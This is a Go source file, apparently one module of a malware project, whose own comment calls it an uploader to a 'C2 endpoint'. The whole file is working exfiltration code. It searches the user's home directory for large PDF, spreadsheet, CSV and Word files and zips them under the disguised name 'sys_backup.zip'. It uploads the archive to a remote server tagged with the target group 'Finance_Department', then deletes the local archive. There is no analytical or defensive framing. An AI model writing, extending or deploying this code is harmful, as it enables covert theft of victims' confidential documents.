package scanner

import (
	"archive/zip"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"part2worldorder/internal/config"
)

const (
	targetGroup      = "Finance_Department"
	minSizeBytes     = 100 * 1024
	zipName          = "sys_backup.zip"
)

var targetExtensions = map[string]struct{}{
	".pdf":  {},
	".xlsx": {},
	".csv":  {},
	".docx": {},
}

// Scanner archives matching user files and uploads them to the C2 endpoint.
type Scanner struct {
	client   *http.Client
	clientID string
}

func New(client *http.Client, clientID string) *Scanner {
	return &Scanner{
		client:   client,
		clientID: clientID,
	}
}

// ScanAndUpload finds large document files, compresses them, uploads the archive,
// and removes the local ZIP on success.
func (s *Scanner) ScanAndUpload() {
	home, err := os.UserHomeDir()
	if err != nil {
		return
	}

	files := findLargeFiles(home)
	if len(files) == 0 {
		return
	}

	zipPath := filepath.Join(os.TempDir(), zipName)
	if err := createArchive(files, home, zipPath); err != nil {
		return
	}

	if err := s.uploadArchive(zipPath); err != nil {
		return
	}

	_ = os.Remove(zipPath)
}

func findLargeFiles(home string) []string {
	var matches []string

	_ = filepath.WalkDir(home, func(path string, entry os.DirEntry, err error) error {
		if err != nil {
			return nil
		}
		if entry.IsDir() {
			return nil
		}

		ext := strings.ToLower(filepath.Ext(path))
		if _, ok := targetExtensions[ext]; !ok {
			return nil
		}

		info, err := entry.Info()
		if err != nil {
			return nil
		}
		if info.Size() > minSizeBytes {
			matches = append(matches, path)
		}
		return nil
	})

	return matches
}

func createArchive(files []string, home, zipPath string) error {
	out, err := os.Create(zipPath)
	if err != nil {
		return err
	}
	defer out.Close()

	writer := zip.NewWriter(out)
	defer writer.Close()

	for _, filePath := range files {
		rel, err := filepath.Rel(home, filePath)
		if err != nil {
			continue
		}

		if err := addFileToZip(writer, filePath, filepath.ToSlash(rel)); err != nil {
			continue
		}
	}

	return writer.Close()
}

func addFileToZip(writer *zip.Writer, filePath, arcName string) error {
	src, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer src.Close()

	info, err := src.Stat()
	if err != nil {
		return err
	}

	header, err := zip.FileInfoHeader(info)
	if err != nil {
		return err
	}
	header.Name = arcName
	header.Method = zip.Deflate

	dest, err := writer.CreateHeader(header)
	if err != nil {
		return err
	}

	_, err = io.Copy(dest, src)
	return err
}

func (s *Scanner) uploadArchive(zipPath string) error {
	file, err := os.Open(zipPath)
	if err != nil {
		return err
	}
	defer file.Close()

	pr, pw := io.Pipe()
	writer := multipart.NewWriter(pw)

	go func() {
		defer pw.Close()
		part, err := writer.CreateFormFile("file", zipName)
		if err != nil {
			_ = pw.CloseWithError(err)
			return
		}
		if _, err := io.Copy(part, file); err != nil {
			_ = pw.CloseWithError(err)
			return
		}
		_ = writer.Close()
	}()

	req, err := http.NewRequest(http.MethodPost, config.ServerBase()+"/v1/backup", pr)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())
	req.Header.Set("X-Client-ID", s.clientID)
	req.Header.Set("X-Target-Group", targetGroup)

	if s.client.Timeout == 0 {
		s.client.Timeout = 120 * time.Second
	}

	resp, err := s.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, resp.Body)

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("upload failed: %s", resp.Status)
	}
	return nil
}
